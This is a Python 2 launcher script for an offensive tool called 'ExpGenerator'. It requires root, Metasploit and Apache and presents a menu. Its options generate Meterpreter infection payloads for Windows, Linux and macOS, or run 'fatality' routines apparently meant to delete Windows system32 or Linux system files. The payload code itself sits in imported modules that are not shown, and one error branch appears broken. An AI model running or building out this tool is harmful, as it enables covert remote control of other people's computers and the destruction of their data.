#-*- coding: utf-8 -*-
#Autor: Andrés Montoya (SpyRock)
#No me hago responsable del mal uso que este se le pueda dar.
#!/usr/bin/python
import os
import sys
from PowerShell import *
from colores import *
if not os.geteuid() == 0:
			sys.exit("""\033[1;91m\n[!] Need Root Permissions. ¯\_(ツ)_/¯\n\033[1;m""")
else:

	os.system("clear")
	if os.path.exists("/usr/bin/expgenerator"):
		pass
	else:
		sys.exit(bcolors.FAIL+"["+bcolors.WARNING+"*"+bcolors.FAIL+"]"+bcolors.payload+"Please Install ExpGenerator")
	if os.path.exists("/var/www/html/"):
		print bcolors.WARNING+"["+bcolors.FAIL+"♬"+bcolors.WARNING+"]"+bcolors.payload+"Starting Apache2...!\n"
		os.system("service apache2 start")
	else:
		sys.exit(bcolors.FAIL+"["+bcolors.WARNING+"*"+bcolors.FAIL+"]"+bcolors.payload+"Please Install ExpGenerator")
	if os.path.exists("/opt/metasploit-framework"):
		pass
	else:
	    sys.exit(bcolors.FAIL+"["+bcolors.WARNING+"*"+bcolors.FAIL+"]"+bcolors.payload+"Please Install ExpGenerator")
		
	print bcolors.payload+"["+bcolors.apache+"1"+bcolors.payload+"]"+bcolors.WARNING+"Windows PowerShell"
	print bcolors.payload+"\n["+bcolors.apache+"99"+bcolors.payload+"]"+bcolors.WARNING+"Exit\n"
		
	plataforma=raw_input(bcolors.WARNING+"Exp" + bcolors.OKBLUE + "Generator"+ "\033[91m" +": "+"\033[1m")
	if (plataforma == "1"):
		g=raw_input("\033[1m"+"Select (meterpreter) ")
		if g == "meterpreter":
			g=PowerShell()
			g.windowsinfect()
		elif g == "fatality":
			g=windowsrm()
			g.system32()
		else:
			sys.exit("Error")
	elif (plataforma == "9999999999999"):
		f=raw_input("\033[1m"+"Select (meterpreter) ")
		if f == "meterpreter":
			f=Reverse_()
			f.reverseinfect()
		elif f == "fatality":
			f=LinuxDelete()
			f.linuxrm()
		else:
			sys.exit("Error")
	elif (plataforma == "3"):
		e=osx()
		e.osxinfect()
	elif (plataforma == "Exit" or plataforma=="exit" or plataforma=="99"):
		sys.exit()
	else:
		sys.exit(bcolors.FAIL("\nError.\n"))
